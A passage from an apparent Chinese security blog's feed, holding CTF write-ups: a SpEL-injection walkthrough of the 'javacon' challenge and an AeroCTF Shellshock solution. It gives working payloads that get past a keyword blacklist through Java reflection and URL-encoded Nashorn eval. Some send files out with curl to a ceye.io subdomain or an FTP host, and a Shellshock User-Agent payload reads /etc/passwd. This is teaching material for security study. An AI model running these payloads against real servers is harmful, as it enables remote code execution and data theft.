    <summary type="html">
    
      
      
        &lt;p&gt;这次Web题只做了前两道，最后一道GO的题目不会就没做了。&lt;/p&gt;
&lt;h2 id=&quot;My-admin-panel&quot;&gt;&lt;a href=&quot;#My-admin-panel&quot; class=&quot;headerlink&quot; title=&quot;My admin panel&quot;&gt;&lt;/a&gt;My admi
      
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SpEL注入之javacon</title>
    <link href="https://Mi1k7ea.github.com/2019/03/17/SpEL%E6%B3%A8%E5%85%A5%E4%B9%8Bjavacon/"/>
    <id>https://Mi1k7ea.github.com/2019/03/17/SpEL注入之javacon/</id>
    <published>2019-03-17T08:51:15.000Z</published>
    <updated>2019-03-23T13:33:53.212Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SpEL注入漏洞"><a href="#SpEL注入漏洞" class="headerlink" title="SpEL注入漏洞"></a>SpEL注入漏洞</h2><h3 id="何为SpEL表达式"><a href="#何为SpEL表达式" class="headerlink" title="何为SpEL表达式"></a>何为SpEL表达式</h3><blockquote><p>Spring Expression Language（简称 SpEL）是一种功能强大的表达式语言、用于在运行时查询和操作对象图；语法上类似于 Unified EL，但提供了更多的特性，特别是方法调用和基本字符串模板函数。SpEL 的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。</p></blockquote><h3 id="SpEL使用方式"><a href="#SpEL使用方式" class="headerlink" title="SpEL使用方式"></a>SpEL使用方式</h3><blockquote><p>SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(<span class="string">"('Hello' + ' Mi1k7ea').concat(#end)"</span>);</span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setVariable(<span class="string">"end"</span>, <span class="string">"!"</span>);</span><br><span class="line">System.out.println(expression.getValue(context));</span><br></pre></td></tr></table></figure><p>具体步骤如下：</p><ol><li>创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；</li><li>解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；</li><li>构造上下文：准备比如变量定义等等表达式需要的上下文数据；</li><li>求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；</li></ol><h3 id="SpEL主要接口"><a href="#SpEL主要接口" class="headerlink" title="SpEL主要接口"></a>SpEL主要接口</h3><ul><li><strong>ExpressionParser 接口</strong>：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；</li><li><strong>EvaluationContext 接口</strong>：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。</li><li><strong>Expression 接口</strong>：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。</li></ul><h3 id="SpEL语法——类相关表达式"><a href="#SpEL语法——类相关表达式" class="headerlink" title="SpEL语法——类相关表达式"></a>SpEL语法——类相关表达式</h3><h4 id="类类型表达式-T-Type"><a href="#类类型表达式-T-Type" class="headerlink" title="类类型表达式 T(Type)"></a>类类型表达式 T(Type)</h4><p>使用”T(Type)”来表示 java.lang.Class 实例，”Type”必须是类全限定名，”java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。</p><p>使用示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"><span class="comment">// java.lang 包类访问</span></span><br><span class="line">Class&lt;String&gt; result1 = parser.parseExpression(<span class="string">"T(String)"</span>).getValue(Class.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line"><span class="comment">//其他包类访问</span></span><br><span class="line">String expression2 = <span class="string">"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')"</span>;</span><br><span class="line">Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line"><span class="comment">//类静态字段访问</span></span><br><span class="line"><span class="keyword">int</span> result3 = parser.parseExpression(<span class="string">"T(Integer).MAX_VALUE"</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(result3);</span><br><span class="line"><span class="comment">//类静态方法调用</span></span><br><span class="line"><span class="keyword">int</span> result4 = parser.parseExpression(<span class="string">"T(Integer).parseInt('1')"</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(result4);</span><br></pre></td></tr></table></figure><h4 id="类实例化"><a href="#类实例化" class="headerlink" title="类实例化"></a>类实例化</h4><p>类实例化同样使用 java 关键字「new」，类名必须是全限定名，但 java.lang 包内的类型除外，如 String、Integer。</p><h4 id="instanceof-表达式"><a href="#instanceof-表达式" class="headerlink" title="instanceof 表达式"></a>instanceof 表达式</h4><p>SpEL 支持 instanceof 运算符，跟 Java 内使用同义；如”‘haha’ instanceof T(String)”将返回 true。</p><h4 id="变量定义以及引用"><a href="#变量定义以及引用" class="headerlink" title="变量定义以及引用"></a>变量定义以及引用</h4><p>变量定义通过 EvaluationContext 接口的 setVariable(variableName, value) 方法定义；在表达式中使用”#variableName”引用；除了引用自定义变量，SpE 还允许引用根对象及当前上下文对象，使用”#root”引用根对象，使用”#this”引用当前上下文对象；</p><h4 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h4><p>目前只支持类静态方法注册为自定义函数；SpEL 使用 StandardEvaluationContext 的registerFunction 方法进行注册自定义函数，其实完全可以使用 setVariable 代替，两者其实本质是一样的。</p><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>全局搜索<code>org.springframework.expression.spel.standard</code>或<code>expression.getValue()</code>、<code>expression.setValue()</code>，再分析代码中传入的参数是否可控。</p><h2 id="javacon题目分析"><a href="#javacon题目分析" class="headerlink" title="javacon题目分析"></a>javacon题目分析</h2><p>本题来自P牛code-breaking中的一道Java题，名为javacon，题目知识点为SpEL注入，这里记下相关笔记。</p><p>题目下载地址：<a href="https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar" target="_blank" rel="noopener">https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar</a></p><p>本地运行：java -jar challenge-0.0.1-SNAPSHOT.jar</p><p>访问页面，是个登录界面，请求参数带有jsessionid，其是在cookie的属性 ：</p><p><img src="/2019/03/17/SpEL注入之javacon/1.png" alt=""></p><p>随意输入，会提示“登陆失败，用户名或者密码错误！”。</p><p>Java题目，一般都是从代码审计入手，用IDEA打开该jar包，主要看/BOOT-INF/classes目录下的文件即可，发现存在一个application.yml文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  thymeleaf:</span></span><br><span class="line"><span class="attr">    encoding:</span> <span class="string">UTF-8</span></span><br><span class="line"><span class="attr">    cache:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">    mode:</span> <span class="string">HTML</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">  blacklist:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">java.+lang</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">Runtime</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">exec.*\(</span></span><br><span class="line"><span class="attr">user:</span></span><br><span class="line"><span class="attr">  username:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">  password:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">  rememberMeKey:</span> <span class="string">c0dehack1nghere1</span></span><br></pre></td></tr></table></figure><p>该文件分了3个模块，spring模块定义了HTML模板、UTF-8编码以及无缓存；keywords定义了黑名单，过滤了“java.lang”、“Runtime”、“exec.(”等；user模块定义了用户名和密码，还有一个记住我的值。</p><p>Spring框架的关键在于Controller，看到MainController.class，其中定义了ExpressionParser属性，该属性在getAdvanceValue()函数中会调用来解析字符串内容，由此可知getAdvanceValue()函数是SpEL注入的触发点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainController</span> </span>&#123;</span><br><span class="line">    ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getAdvanceValue</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">        String[] var2 = <span class="keyword">this</span>.keyworkProperties.getBlacklist();</span><br><span class="line">        <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            String keyword = var2[var4];</span><br><span class="line">            Matcher matcher = Pattern.compile(keyword, <span class="number">34</span>).matcher(val);</span><br><span class="line">            <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpClientErrorException(HttpStatus.FORBIDDEN);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ParserContext parserContext = <span class="keyword">new</span> TemplateParserContext();</span><br><span class="line">        Expression exp = <span class="keyword">this</span>.parser.parseExpression(val, parserContext);</span><br><span class="line">        SmallEvaluationContext evaluationContext = <span class="keyword">new</span> SmallEvaluationContext();</span><br><span class="line">        <span class="keyword">return</span> exp.getValue(evaluationContext).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看看哪里调用的getAdvanceValue()函数，发现是在admin()函数中调用了，传递的参数是username的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@CookieValue(value = <span class="string">"remember-me"</span>,required = <span class="keyword">false</span>)</span> String rememberMeValue, HttpSession session, Model model) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rememberMeValue != <span class="keyword">null</span> &amp;&amp; !rememberMeValue.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">    String username = <span class="keyword">this</span>.userConfig.decryptRememberMe(rememberMeValue);</span><br><span class="line">        <span class="keyword">if</span> (username != <span class="keyword">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object username = session.getAttribute(<span class="string">"username"</span>);</span><br><span class="line">    <span class="keyword">if</span> (username != <span class="keyword">null</span> &amp;&amp; !username.toString().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">        model.addAttribute(<span class="string">"name"</span>, <span class="keyword">this</span>.getAdvanceValue(username.toString()));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"redirect:/login"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="meta">@PostMapping</span>(&#123;<span class="string">"/login"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(@RequestParam(value = <span class="string">"username"</span>,required = <span class="keyword">true</span>)</span> String username, @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"password"</span>,required = <span class="keyword">true</span>)</span> String password, @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"remember-me"</span>,required = <span class="keyword">false</span>)</span> String isRemember, HttpSession session, HttpServletResponse response) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.userConfig.getUsername().contentEquals(username) &amp;&amp; <span class="keyword">this</span>.userConfig.getPassword().contentEquals(password)) &#123;</span><br><span class="line">        session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">        <span class="keyword">if</span> (isRemember != <span class="keyword">null</span> &amp;&amp; !isRemember.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            Cookie c = <span class="keyword">new</span> Cookie(<span class="string">"remember-me"</span>, <span class="keyword">this</span>.userConfig.encryptRememberMe());</span><br><span class="line">            c.setMaxAge(<span class="number">2592000</span>);</span><br><span class="line">            response.addCookie(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/login-error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里研究一下怎么控制这个username的值，先看注解为”/login”的login()函数，其传入3个参数，第三个remember-me为非必须的，在第一个if语句即判断username和password是否是正确的，是则通过调用<code>session.setAttribute(&quot;username&quot;)</code>来设置session中的username值，再判断remember-me的值进行设置，然后重定向到主页面，否则登录失败直接返回错误信息。也就是说，这里是没办法进行SpEL注入的，因为username和password都写不正确如何进入后面的逻辑呢？</p><p>再来看看主页面的代码逻辑即注解为“@GetMapping”的admin()函数。先判断remember-me是否为空，为空时直接调用<code>session.getAttribute(&quot;username&quot;);</code>获取session中即login()函数中设置的username再调用getAdvanceValue()函数，此时因为username是正确的用户名因此无法SpEL注入；若rememberMeValue不为空即login时选择了remember-me，则解码rememberMeValue值为username并通过调用<code>session.setAttribute(&quot;username&quot;)</code>来设置session中的username值，此时的username就可控了。</p><p>那么注入点的场景已经可以确定了：输入admin/admin并勾选remember-me选项登录后台，然后再修改cookie内容即可。</p><p>先登录到admin界面，看到会设置Cookie字段值为<code>remember-me=MXPUSANQRVaBJYtUucUgmQ==</code>：</p><p><img src="/2019/03/17/SpEL注入之javacon/2.png" alt=""></p><p>直接调用或复制加密代码，在它的代码中找到几个参数然后传进加密处理，执行完毕结果和Cookie字段值的base64结果一致：</p><p><img src="/2019/03/17/SpEL注入之javacon/3.png" alt=""></p><p>行吧，那就将变量value从admin改为Mi1k7ea试试，得到加密值为4Hd10g7CuZZg5M1up1GExg==，放到cookie中发送报文，可以看到admin修改为Mi1k7ea，说明这里即为SpEL注入点：</p><p><img src="/2019/03/17/SpEL注入之javacon/4.png" alt=""></p><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>开始网上搜的一大堆SpEL注入exp无法利用，因为这里使用了黑名单过滤了<code>java.lang</code>、<code>Runtime</code>和<code>exec(</code>。</p><p>尝试了使用ProcessBuilder().start()来绕过，但是没利用成功。</p><p>后面参考了<a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">一篇wp</a>，发现可以用Java的反射机制来绕过，具体绕过原理是因为通过反射机制的forName()和getMethod()等方法，其参数是字符串因此可通过字符串拼接的方式来绕过黑名单。</p><h3 id="Windows场景"><a href="#Windows场景" class="headerlink" title="Windows场景"></a>Windows场景</h3><h4 id="本地弹计算器"><a href="#本地弹计算器" class="headerlink" title="本地弹计算器"></a>本地弹计算器</h4><p>常见的payload为<code>String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;});</code>，但是这里需要改为SpEl的解析格式以满足Spring的解析条件，主要就是改一个T() 。在SpEL中，使用T()运算符会调用类作用域的方法和常量。</p><p>注意，以<code>new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;xx&quot;}</code>这种形式定义命令是为了满足Linux下复杂命令构造的条件，通用。当然Linux下应该写为<code>new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;xxxxx&quot;}</code>。</p><p>payload如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","calc"&#125;)&#125;</span><br></pre></td></tr></table></figure><p>加密后发送过去，SpEL注入成功：</p><p><img src="/2019/03/17/SpEL注入之javacon/5.png" alt=""></p><h4 id="回带flag"><a href="#回带flag" class="headerlink" title="回带flag"></a>回带flag</h4><p>这里换下payload，读取本地flag文件，由于没有回显，需要外带出来，使用curl命令结合反引号执行系统命令并带回：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","curl xx.ceye.io/`dir`"&#125;)&#125;</span><br></pre></td></tr></table></figure><p>但是在Windows上这段代码不能将命令执行带回来，因为Windows中cmd不会解析反引号，只会将命令原封不动地返回过来：</p><p><img src="/2019/03/17/SpEL注入之javacon/7.png" alt=""></p><p>既然这样，就使用curl的-T参数往外上传文件，然后通过ftp接收即可：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","curl -T flag.txt ftp://192.168.248.1/"&#125;)&#125;</span><br></pre></td></tr></table></figure><p>发送编码后的payload，在目标FTP端看到接收的文件，收到上传flag.txt：</p><p><img src="/2019/03/17/SpEL注入之javacon/8.png" alt=""></p><p><img src="/2019/03/17/SpEL注入之javacon/9.png" alt=""></p><h3 id="Linux场景"><a href="#Linux场景" class="headerlink" title="Linux场景"></a>Linux场景</h3><p>一般题目环境为Linux，这里直接换如下命令即可，其中curl命令可直接结合反引号使用，中间加上base64命令将所有结果编码以便于可以带回所有内容而非只有第一行结果，最后tr命令将结果中的换行符换为-以便于后面解码的使用：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","curl xx.ceye.io/`cat flag.txt|base64|tr '\n' '-'`"&#125;)&#125;</span><br></pre></td></tr></table></figure><h2 id="JavaScript引擎Bypass"><a href="#JavaScript引擎Bypass" class="headerlink" title="JavaScript引擎Bypass"></a>JavaScript引擎Bypass</h2><p>在Java 1.8之后，Nashorn取代了Rhino（Java 1.6/1.7）成为Java的嵌入式JavaScript引擎。</p><p>也就是说，可以通过Java调用该JS引擎，然后通过JS引擎调用eval()来执行Java代码。</p><h3 id="基本payload"><a href="#基本payload" class="headerlink" title="基本payload"></a>基本payload</h3><p>基本Payload示例如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)&#125;</span><br></pre></td></tr></table></figure><p>要想在本题执行命令，需要结合前面构造的反射机制来实现：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","calc"&#125;)),)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/03/17/SpEL注入之javacon/11.png" alt=""></p><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>前面的payload有点麻烦，感觉多此一举，这里我们可以升级一下payload，进行URL编码，可以绕过一些过滤机制，并无需结合反射机制：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)&#125;</span><br></pre></td></tr></table></figure><p>其中URL编码内容为：<code>java.lang.Runtime.getRuntime().exec(&quot;calc&quot;).getInputStream()</code>，不加最后的getInputStream()也行，只是为了后面回显铺垫。</p><p>在这道题可以成功Bypass黑名单实现SpEL注入：</p><p><img src="/2019/03/17/SpEL注入之javacon/6.png" alt=""></p><h3 id="添加回显"><a href="#添加回显" class="headerlink" title="添加回显"></a>添加回显</h3><p>增加回显的payload如下，其中URL编码内容为<code>java.lang.Runtime.getRuntime().exec(&quot;ipconfig&quot;).getInputStream()</code>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%70%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())&#125;</span><br></pre></td></tr></table></figure><p>访问直接得到命令执行结果：</p><p><img src="/2019/03/17/SpEL注入之javacon/10.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">Code-Breaking Puzzles — javacon WriteUp</a></p><p><a href="https://www.freebuf.com/vuls/197008.html" target="_blank" rel="noopener">Java代码审计之SpEL表达式注入</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SpEL注入漏洞&quot;&gt;&lt;a href=&quot;#SpEL注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;SpEL注入漏洞&quot;&gt;&lt;/a&gt;SpEL注入漏洞&lt;/h2&gt;&lt;h3 id=&quot;何为SpEL表达式&quot;&gt;&lt;a href=&quot;#何为SpEL表达式&quot; class=&quot;he
      
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>AeroCTF writeupup之board tracking system</title>
    <link href="https://Mi1k7ea.github.com/2019/03/13/AeroCTF-writeupup%E4%B9%8Bboard-tracking-system/"/>
    <id>https://Mi1k7ea.github.com/2019/03/13/AeroCTF-writeupup之board-tracking-system/</id>
    <published>2019-03-13T15:08:59.000Z</published>
    <updated>2019-03-13T15:43:30.106Z</updated>
    
    <content type="html"><![CDATA[<p>题目如下，大概意思是开发了一个追踪系统，问是否是有安全漏洞的：</p><p><img src="/2019/03/13/AeroCTF-writeupup之board-tracking-system/1.png" alt=""></p><p>打开页面，看到加载了一段Stats内容：</p><p><img src="/2019/03/13/AeroCTF-writeupup之board-tracking-system/2.png" alt=""></p><p>查看源码发现该段内容是请求了一个URL加载过来的，访问该地址，是包含cgi-bin路径的：</p><p><img src="/2019/03/13/AeroCTF-writeupup之board-tracking-system/3.png" alt=""></p><p>由cgi-bin我们可以联想到大名鼎鼎的Bash远程命令执行漏洞。记得之前看过的一篇文章：<a href="https://www.freebuf.com/vuls/44994.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/44994.html</a></p><p>那就测试一下，在UserAgent注入payload<code>User-Agent: () { :;};echo -e &quot;\r\n$(/usr/bin/whoami)&quot;</code>发现成功执行whoami命令：</p><p><img src="/2019/03/13/AeroCTF-writeupup之board-tracking-system/4.png" alt=""></p><p>接着就使用ls寻找flag相关文件有没有，在当前目录找到stats文件：</p><p><img src="/2019/03/13/AeroCTF-writeupup之board-tracking-system/5.png" alt=""></p><p>cat看下stats文件有啥：</p><p><img src="/2019/03/13/AeroCTF-writeupup之board-tracking-system/7.png" alt=""></p><p>没啥东西，继续用ls看其他目录，没啥进展。</p><p>最后在查看/etc/passwd时找到了这个隐藏的flag：</p><p><img src="/2019/03/13/AeroCTF-writeupup之board-tracking-system/6.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目如下，大概意思是开发了一个追踪系统，问是否是有安全漏洞的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/03/13/AeroCTF-writeupup之board-tracking-system/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;打开页面，看到加载了一段St
      
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>TAMUctf Web writeup</title>
    <link href="https://Mi1k7ea.github.com/2019/03/09/TAMUctf-Web-writeup/"/>
    <id>https://Mi1k7ea.github.com/2019/03/09/TAMUctf-Web-writeup/</id>
    <published>2019-03-09T12:44:41.000Z</published>
    <updated>2019-03-10T07:48:32.618Z</updated>
    
